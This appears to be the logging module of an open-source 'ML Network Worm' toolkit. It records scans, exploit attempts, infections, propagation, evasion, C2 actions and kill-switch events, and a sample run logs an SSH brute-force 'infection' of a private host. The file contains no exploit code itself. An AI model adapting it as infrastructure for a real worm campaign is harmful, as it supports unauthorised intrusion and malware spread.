"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
ML Network Worm - Logging System
Comprehensive logging with encryption, rotation, and audit trail
"""


import json
import logging
import os
import sys
import traceback
from datetime import datetime
from logging.handlers import RotatingFileHandler
from pathlib import Path
from typing import Any, Dict, Optional

from colorama import Fore, Style, init

init(autoreset=True)

# Color formatters for console
COLOR_MAP = {
    "DEBUG": Fore.WHITE,
    "INFO": Fore.CYAN,
    "SUCCESS": Fore.GREEN,
    "WARNING": Fore.YELLOW,
    "ERROR": Fore.RED,
    "CRITICAL": Fore.RED + Style.BRIGHT,
}


class ColoredFormatter(logging.Formatter):
    """Console formatter with colors"""

    def format(self, record):
        color = COLOR_MAP.get(record.levelname, Fore.WHITE)
        record.levelname = f"{color}{record.levelname}{Style.RESET_ALL}"
        return super().format(record)


class WormLogger:
    """Advanced logging system with rotation and structured output"""

    MAX_LOG_SIZE = 10 * 1024 * 1024  # 10MB
    MAX_LOG_FILES = 5

    def __init__(self, log_dir: str = "logs", encrypt: bool = False):
        self.log_dir = Path(log_dir)
        self.log_dir.mkdir(exist_ok=True)
        self.encrypt = encrypt

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = self.log_dir / f"worm_{timestamp}.log"
        self.json_log_file = self.log_dir / f"worm_{timestamp}.json"

        # Setup Python logger with rotation
        self.logger = logging.getLogger("Wormy")
        self.logger.setLevel(logging.DEBUG)
        self.logger.handlers.clear()

        # Rotating file handler
        fh = RotatingFileHandler(
            self.log_file,
            maxBytes=self.MAX_LOG_SIZE,
            backupCount=self.MAX_LOG_FILES,
            encoding="utf-8",
        )
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(
            logging.Formatter(
                "%(asctime)s - %(levelname)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S"
            )
        )

        # Console handler with colors
        ch = logging.StreamHandler(sys.stdout)
        ch.setLevel(logging.INFO)
        ch.setFormatter(ColoredFormatter("%(levelname)s - %(message)s"))

        # Error handler - always writes to stderr with full traceback
        eh = logging.StreamHandler(sys.stderr)
        eh.setLevel(logging.ERROR)
        eh.setFormatter(
            logging.Formatter(
                "%(asctime)s - %(levelname)s - %(message)s\n%(exc_info)s",
                datefmt="%Y-%m-%d %H:%M:%S",
            )
        )

        self.logger.addHandler(fh)
        self.logger.addHandler(ch)
        self.logger.addHandler(eh)

        # JSON log for structured data
        self.json_logs = []
        self._json_file_handle = open(self.json_log_file, "a", encoding="utf-8")

        self.info("Logger initialized", {"log_dir": str(self.log_dir)})

    def _log_json(self, level: str, message: str, data: Optional[Dict[str, Any]] = None):
        """Log structured JSON data"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "level": level,
            "message": message,
            "data": data or {},
        }
        self.json_logs.append(log_entry)

        try:
            json_line = json.dumps(log_entry, default=str) + "\n"
            self._json_file_handle.write(json_line)
            self._json_file_handle.flush()
        except Exception:
            pass

    def _log_with_traceback(
        self, level_method, message: str, data: Optional[Dict] = None, exc_info: bool = True
    ):
        """Log with optional exception traceback"""
        level_method(message)
        self._log_json(level_method.__name__.upper(), message, data)
        if exc_info:
            tb = traceback.format_exc()
            if tb and tb.strip() != "NoneType: None":
                self.logger.debug(f"Traceback:\n{tb}")

    def debug(self, message: str, data: Optional[Dict[str, Any]] = None):
        self.logger.debug(message)
        self._log_json("DEBUG", message, data)

    def info(self, message: str, data: Optional[Dict[str, Any]] = None):
        self.logger.info(message)
        self._log_json("INFO", message, data)

    def success(self, message: str, data: Optional[Dict[str, Any]] = None):
        self.logger.info(f"SUCCESS: {message}")
        self._log_json("SUCCESS", message, data)

    def warning(self, message: str, data: Optional[Dict[str, Any]] = None):
        self.logger.warning(message)
        self._log_json("WARNING", message, data)

    def error(self, message: str, data: Optional[Dict[str, Any]] = None, exc_info: bool = True):
        self._log_with_traceback(self.logger.error, message, data, exc_info)

    def critical(self, message: str, data: Optional[Dict[str, Any]] = None):
        self._log_with_traceback(self.logger.critical, message, data, exc_info=True)

    # Specialized logging

    def log_scan(self, target: str, result: str, data: Optional[Dict[str, Any]] = None):
        self.info(
            f"Scan: {target} - {result}",
            {"activity": "scan", "target": target, "result": result, **(data or {})},
        )

    def log_exploit(
        self, target: str, exploit: str, success: bool, data: Optional[Dict[str, Any]] = None
    ):
        level = "success" if success else "warning"
        msg = f"Exploit: {exploit} on {target} - {'SUCCESS' if success else 'FAILED'}"
        log_data = {
            "activity": "exploit",
            "target": target,
            "exploit": exploit,
            "success": success,
            **(data or {}),
        }
        if success:
            self.success(msg, log_data)
        else:
            self.warning(msg, log_data)

    def log_infection(self, target: str, method: str, data: Optional[Dict[str, Any]] = None):
        self.success(
            f"Infected: {target} via {method}",
            {"activity": "infection", "target": target, "method": method, **(data or {})},
        )

    def log_propagation(self, source: str, target: str, data: Optional[Dict[str, Any]] = None):
        self.info(
            f"Propagating: {source} -> {target}",
            {"activity": "propagation", "source": source, "target": target, **(data or {})},
        )

    def log_evasion(self, technique: str, result: str, data: Optional[Dict[str, Any]] = None):
        self.info(
            f"Evasion: {technique} - {result}",
            {"activity": "evasion", "technique": technique, "result": result, **(data or {})},
        )

    def log_c2(self, action: str, data: Optional[Dict[str, Any]] = None):
        self.debug(f"C2: {action}", {"activity": "c2", "action": action, **(data or {})})

    def log_ml_decision(
        self, model: str, decision: str, confidence: float, data: Optional[Dict[str, Any]] = None
    ):
        self.info(
            f"ML Decision: {model} - {decision} (confidence: {confidence:.2f})",
            {
                "activity": "ml_decision",
                "model": model,
                "decision": decision,
                "confidence": confidence,
                **(data or {}),
            },
        )

    def log_kill_switch(self, reason: str):
        self.critical(
            f"KILL SWITCH ACTIVATED: {reason}", {"activity": "kill_switch", "reason": reason}
        )

    def get_statistics(self) -> Dict[str, Any]:
        stats = {
            "total_logs": len(self.json_logs),
            "scans": 0,
            "exploits": 0,
            "infections": 0,
            "successful_exploits": 0,
            "failed_exploits": 0,
            "evasions": 0,
            "c2_communications": 0,
            "ml_decisions": 0,
        }
        for log in self.json_logs:
            data = log.get("data", {})
            activity = data.get("activity", "")
            if activity == "scan":
                stats["scans"] += 1
            elif activity == "exploit":
                stats["exploits"] += 1
                if data.get("success"):
                    stats["successful_exploits"] += 1
                else:
                    stats["failed_exploits"] += 1
            elif activity == "infection":
                stats["infections"] += 1
            elif activity == "evasion":
                stats["evasions"] += 1
            elif activity == "c2":
                stats["c2_communications"] += 1
            elif activity == "ml_decision":
                stats["ml_decisions"] += 1
        return stats

    def export_logs(self, output_file: str):
        with open(output_file, "w") as f:
            json.dump(self.json_logs, f, indent=2, default=str)
        self.info(f"Logs exported to {output_file}")

    def close(self):
        """Clean up resources"""
        if hasattr(self, "_json_file_handle") and self._json_file_handle:
            self._json_file_handle.close()
        for handler in self.logger.handlers:
            handler.close()
        self.logger.handlers.clear()

    def __del__(self):
        try:
            self.close()
        except Exception:
            pass


# Global logger instance
logger = WormLogger()


if __name__ == "__main__":
    logger.info("Testing logger")
    logger.log_scan("192.168.1.100", "Host alive", {"ports": [22, 80]})
    logger.log_exploit("192.168.1.100", "SSH_BruteForce", True, {"username": "admin"})
    logger.log_infection("192.168.1.100", "SSH", {"os": "Linux"})
    print("\nStatistics:")
    print(json.dumps(logger.get_statistics(), indent=2))
    logger.close()
